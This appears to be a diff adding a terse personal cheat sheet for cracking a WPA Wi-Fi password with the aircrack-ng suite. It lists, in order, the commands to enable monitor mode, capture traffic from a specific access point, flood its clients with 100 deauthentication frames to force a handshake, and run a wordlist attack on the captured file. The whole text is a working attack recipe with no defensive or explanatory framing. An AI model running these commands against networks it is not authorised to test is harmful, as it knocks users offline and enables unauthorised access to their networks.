@@ -1,0 +1,13 @@
+airmon-ng start wlan0
+
+airodump-ng wlan0mon  (new tab)
+
+airodump-ng --bssid BC:C0:0F:22:41:78 -c 1 --write WPAcrack wlan0mon  (new tab)
+
+aireplay-ng --deauth 100 -a BC:C0:0F:22:41:78 wlan0mon  (check WPA handshake)
+
+aircrack-ng -w pass.txt -b BC:C0:0F:22:41:78 WPAcrack-0.cap  (wait tpasswd)
+
+
+
+
